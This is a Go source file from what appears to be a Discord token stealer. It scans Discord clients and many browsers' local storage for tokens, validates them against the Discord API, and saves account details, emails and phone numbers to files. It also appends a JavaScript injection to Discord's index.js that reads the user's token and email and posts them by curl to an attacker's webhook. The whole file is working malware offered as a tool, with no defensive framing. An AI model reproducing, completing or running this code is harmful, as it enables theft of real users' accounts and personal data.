package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"time"
)

type DiscordPath struct {
	Name       string `json:"name"`
	Location   string `json:"path"`
	InfectPath string `json:"infect_path"`
	Infected   bool   `json:"infected"`
}

type Token struct {
	Token string      `json:"token"`
	Path  DiscordPath `json:"location"`
}

type Account struct {
	Token         Token
	ID            string `json:"id"`
	Username      string `json:"username"`
	Discriminator string `json:"discriminator"`
	Avatar        string `json:"avatar"`
	Email         string `json:"email"`
	Phone         string `json:"phone"`
	Bio           string `json:"bio"`
	Language      string `json:"locale"`
	MFA           bool   `json:"mfa_enabled"`
	NSFW          bool   `json:"nsfw_allowed"`
	Nitro         int    `json:"premium_type"`
}

type Discord struct {
	Paths    []DiscordPath
	Tokens   []Token
	Accounts []Account
}

func (discord *Discord) FormatTokensFound() string {
	// Format discord paths and tokens stolen table for embed

	// Check if any tokens were counted and return "None found" if not
	if len(discord.Tokens) == 0 {
		return "No Tokens Found"
	}

	// Create a map to store the count of tokens per path
	tokenCount := make(map[string]int)

	// Iterate through each token and update the count for its corresponding path
	for _, token := range discord.Tokens {
		for _, path := range discord.Paths {
			if path.Name == token.Path.Name || path.Location == token.Path.Location {
				tokenCount[path.Name]++
			}
		}
	}

	// Create a buffer to store the formatted output
	var buffer bytes.Buffer

	// Write the header
	buffer.WriteString(fmt.Sprintf("%-10s %-10s %-10s\n", "Path", "Tokens", "Infected"))
	buffer.WriteString(fmt.Sprintf("%-10s %-10s %-10s\n", "----", "------", "--------"))

	// Iterate through each path and write its token count to the table
	for _, path := range discord.Paths {
		if count, ok := tokenCount[path.Name]; ok {
			buffer.WriteString(fmt.Sprintf("%-10s %-10d %-10s\n",
				path.Name,
				count,
				strconv.FormatBool(path.Infected)))
		}
	}

	return buffer.String()
}

func InfectPath(path DiscordPath) bool {
	defer TimeTrack(time.Now())

	// Add the Discord Injection script to the end of the paths index.js file content (path.InfectPath)
	infectFile, err := filepath.Glob(fmt.Sprintf("%s\\modules\\discord_modules-*\\discord_modules\\index.js", userPath+path.InfectPath))

	if err == nil && len(infectFile) > 0 {
		readFile, err := os.ReadFile(infectFile[0])

		if err == nil && !strings.Contains(string(readFile), webhookUrl) {
			var fileData = string(readFile)
			fileData = fileData + fmt.Sprintf(discordInjection, webhookUrl, path.Name)

			os.WriteFile(
				infectFile[0],
				[]byte(fileData),
				0777,
			)

			return true
		}
	}

	return false
}

func GetTokensFromPath(path DiscordPath) (tokens []string) {
	defer TimeTrack(time.Now())

	// Locate and parse any tokens from the given storage path
	pathLocation := path.Location + "\\Local Storage\\leveldb\\"
	files, _ := os.ReadDir(pathLocation)

	for _, file := range files {
		name := file.Name()
		if strings.HasSuffix(name, ".log") || strings.HasSuffix(name, ".ldb") {
			content, _ := os.ReadFile(pathLocation + "/" + name)
			lines := bytes.Split(content, []byte("\\n"))

			for _, line := range lines {
				if strings.Contains(path.Name, "cord") {
					GetEncryptedToken(line, path.Location, &tokens)
				} else {
					GetDecryptedToken(line, &tokens)
				}
			}
		}
	}

	return tokens
}

func (stealer *Stealer) WriteDiscordJson() {
	defer TimeTrack(time.Now())
	// Write the accounts to accounts.json and tokens to tokens.txt in the Output directory
	if len(stealer.Apps.Discord.Accounts) > 0 {
		var discordOutputPath = outputPath + "\\Discord"
		if os.Mkdir(discordOutputPath, 0666) != nil {
			return
		}

		tokensFile := File{Path: CleanPath(discordOutputPath + "\\" + "tokens.txt")}
		accountsFile := File{Path: CleanPath(discordOutputPath + "\\" + "accounts.json")}

		for _, account := range stealer.Apps.Discord.Accounts {
			WriteString(tokensFile.Path, account.Token.Token)

			jsonData, _ := json.MarshalIndent(account, "", "  ")
			jsonData = append(jsonData, []byte("\n")...)
			f, err := os.OpenFile(accountsFile.Path, os.O_WRONLY|os.O_APPEND|os.O_CREATE, 0644)
			if err != nil {
				continue
			}
			defer f.Close()

			if _, err := f.Write(jsonData); err != nil {
				continue
			}
		}

		tokensFile.Move(discordOutputPath)
		accountsFile.Move(discordOutputPath)
	}
}

func (stealer *Stealer) GetAccountFromToken(token Token) Account {
	defer TimeTrack(time.Now())

	// Fetch account information using the Discord API and the supplied token
	account := Account{Token: token} // Default account value

	client := &http.Client{}
	req, _ := http.NewRequest("GET", discordAPI, nil)
	req.Header.Set("Authorization", token.Token)

	resp, err := client.Do(req)
	if err != nil {
		return account
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusOK {
		json.NewDecoder(resp.Body).Decode(&account)
		if account.Bio == "" {
			account.Bio = "No Account Bio Active"
		}
		if account.Email == "" {
			account.Email = "None"
		}
		if account.Phone == "" {
			account.Phone = "None"
		}
		account.Avatar = fmt.Sprintf("https://cdn.discordapp.com/avatars/%s/%s.png", account.ID, account.Avatar)

		stealer.Apps.Discord.Tokens = append(stealer.Apps.Discord.Tokens, token)
		stealer.Apps.Discord.Accounts = append(stealer.Apps.Discord.Accounts, account)

		return account
	}

	return account
}

func (stealer *Stealer) GetTokens() {
	defer TimeTrack(time.Now())

	// Get all available and validated Discord tokens

	// Loop through available paths
	for i, path := range discordPaths {
		if _, err := os.Stat(path.Location); os.IsNotExist(err) {
			continue // Path not found
		}
		if injectIntoDiscord {
			if len(path.InfectPath) != 0 {
				discordPaths[i].Infected = InfectPath(path)
			}
		}

		tempTokens := GetTokensFromPath(path)
		if len(tempTokens) > 0 { // Tokens were found in the path
			for _, token := range tempTokens {
				// Get Account derived from Token and validate it in the process
				stealer.GetAccountFromToken(Token{
					Token: token,
					Path:  path,
				})
			}
		}
	}

	stealer.Apps.Discord.Paths = discordPaths
	stealer.WriteDiscordJson()
}

var (
	discordAPI   = "https://discord.com/api/v9/users/@me"
	discordPaths = []DiscordPath{
		{Name: "Discord", Location: roaming + "\\discord", InfectPath: "\\AppData\\Local\\Discord\\app-1.*"},
		{Name: "Discord Canary", Location: roaming + "\\discordcanary", InfectPath: "\\AppData\\Local\\DiscordCanary\\app-1.*"},
		{Name: "Discord PTB", Location: roaming + "\\discordptb", InfectPath: "\\AppData\\Local\\DiscordPTB\\app-1.*"},
		{Name: "Discord Dev", Location: roaming + "\\discorddevelopment", InfectPath: "\\AppData\\Local\\DiscordDevelopment\\app-1.*"},
		{Name: "Lightcord", Location: roaming + "\\Lightcord"},
		{Name: "Opera", Location: roaming + "\\Opera Software\\Opera Stable"},
		{Name: "Opera GX", Location: roaming + "\\Opera Software\\Opera GX Stable"},
		{Name: "Amigo", Location: local + "\\Amigo\\User Data"},
		{Name: "Torch", Location: local + "\\Torch\\User Data"},
		{Name: "Kometa", Location: local + "\\Kometa\\User Data"},
		{Name: "Orbitum", Location: local + "\\Orbitum\\User Data"},
		{Name: "CentBrowser", Location: local + "\\CentBrowser\\User Data"},
		{Name: "7Star", Location: local + "\\7Star\\7Star\\User Data"},
		{Name: "Sputnik", Location: local + "\\Sputnik\\Sputnik\\User Data"},
		{Name: "Vivaldi", Location: local + "\\Vivaldi\\User Data\\Default"},
		{Name: "Chrome SxS", Location: local + "\\Google\\Chrome SxS\\User Data"},
		{Name: "Chrome", Location: local + "\\Google\\Chrome\\User Data\\Default"},
		{Name: "Chrome 1", Location: local + "\\Google\\Chrome\\User Data\\Profile 1"},
		{Name: "Chrome 2", Location: local + "\\Google\\Chrome\\User Data\\Profile 2"},
		{Name: "Chrome 3", Location: local + "\\Google\\Chrome\\User Data\\Profile 3"},
		{Name: "Chrome 4", Location: local + "\\Google\\Chrome\\User Data\\Profile 4"},
		{Name: "Chrome 5", Location: local + "\\Google\\Chrome\\User Data\\Profile 5"},
		{Name: "Chrome 6", Location: local + "\\Google\\Chrome\\User Data\\Profile 6"},
		{Name: "Chrome 7", Location: local + "\\Google\\Chrome\\User Data\\Profile 7"},
		{Name: "Chrome 8", Location: local + "\\Google\\Chrome\\User Data\\Profile 8"},
		{Name: "Epic Browser", Location: local + "\\Epic Privacy Browser\\User Data"},
		{Name: "Microsoft Edge", Location: local + "\\Microsoft\\Edge\\User Data\\Default"},
		{Name: "Uran", Location: local + "\\uCozMedia\\Uran\\User Data\\Default"},
		{Name: "Yandex", Location: local + "\\Yandex\\YandexBrowser\\User Data\\Default"},
		{Name: "Brave", Location: local + "\\BraveSoftware\\Brave-Browser\\User Data\\Default"},
		{Name: "Iridium", Location: local + "\\Iridium\\User Data\\Default"},

		// You can add more paths here if you wish, just follow the aforementioned DiscordPath format.
	}
)

// Not currently functional (needs to be rewritten) - Pro version injection is working

var discordInjection = `
module.exports = require('./discord_modules.node');
const i = document.createElement('iframe');
document.body.appendChild(i);
const webhook = '%s';
require('child_process').exec('curl -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\\"content\\\": \\"Discord token logged on '+i.contentWindow.localStorage.email_cache+': '+i.contentWindow.localStorage.token.replace(/^"(.*)"$/, '$1')+'\\"}" ${webhook}',{ cwd: this.entityPath });`
